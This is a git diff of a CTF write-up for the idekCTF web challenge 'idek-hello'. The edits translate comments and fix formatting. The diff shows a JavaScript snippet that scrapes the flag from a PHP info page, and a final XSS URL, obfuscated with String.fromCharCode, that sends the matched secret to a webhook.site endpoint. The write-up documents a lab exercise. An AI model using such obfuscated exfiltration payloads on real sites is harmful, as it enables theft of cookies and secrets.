@@ -12,17 +12,16 @@ After a long hiatus from updating articles, this time an update will cover the w
 **Challenge Description:**\
 `Just to warm you up for the next Fight :"D`
 `Note: the admin bot is not on the same machine as the challenge itself and the`
-`.chal.idek.team:1337 URL should be used for the admin bot URL`
+`.chal.idek.team:1337 URL should be used for the admin bot URL`\
 `Author: Abdelhameed Ghazy`
 
-[Chall](http://idek-hello.chal.idek.team:1337/)
-[Admin Bot](https://admin-bot.idek.team/idek-hello)
+[Chall](http://idek-hello.chal.idek.team:1337/)\
+[Admin Bot](https://admin-bot.idek.team/idek-hello)\
 [Attachments](https://idekctf-challenges.storage.googleapis.com/uploads/f64f1dd16fae27e943a8f7dab349e00509f39c63bb2278328ac5783d867fa393/idek-hello.tar.gz)
 
 **Analysis:**\
 Since this challenge is a Whitebox challenge with the provided source code, a source code review must be conducted first. The structure of the provided source code files is as follows:
 
-.
 ├── bot.js\
 ├── docker-compose.yml\
 ├── hello\
@@ -141,7 +140,7 @@ Since the flow is now clear, exploitation can begin immediately.
 Using the discovered bypass techniques, an XSS payload is constructed to steal cookies from the PHP Info page using the following regex:
 
 ```javascript
-// Ubah menjadi decimal
+// Convert to decimal
 fetch("http://idek-hello.chal.idek.team:1337/info.php/index.php")
   .then((response) => response.text())
   .then((data) => {
@@ -157,7 +156,7 @@ fetch("http://idek-hello.chal.idek.team:1337/info.php/index.php")
     }
   });
 
-// Payload final yang di submit ke bot Admin
+// Final Payload
 http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=javascript:eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,105,100,101,107,45,104,101,108,108,111,46,99,104,97,108,46,105,100,101,107,46,116,101,97,109,58,49,51,51,55,47,105,110,102,111,46,112,104,112,47,105,110,100,101,120,46,112,104,112,39,41,46,116,104,101,110,40,114,101,115,112,111,110,115,101,32,61,62,32,114,101,115,112,111,110,115,101,46,116,101,120,116,40,41,41,46,116,104,101,110,40,100,97,116,97,32,61,62,32,123,99,111,110,115,116,32,114,101,103,101,120,32,61,32,47,105,100,101,107,92,123,46,42,63,92,125,47,103,59,99,111,110,115,116,32,109,97,116,99,104,101,115,32,61,32,100,97,116,97,46,109,97,116,99,104,40,114,101,103,101,120,41,59,105,102,32,40,109,97,116,99,104,101,115,41,32,123,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,101,57,102,57,53,53,99,98,45,54,48,55,53,45,52,51,97,57,45,97,53,56,97,45,53,50,49,100,98,48,48,54,101,100,99,100,39,32,43,32,39,63,101,110,99,111,100,101,100,77,97,116,99,104,101,115,61,39,32,43,32,98,116,111,97,40,109,97,116,99,104,101,115,41,44,32,123,32,109,101,116,104,111,100,58,32,39,71,69,84,39,32,125,41,59,125,125,41,59))>
 ```
 
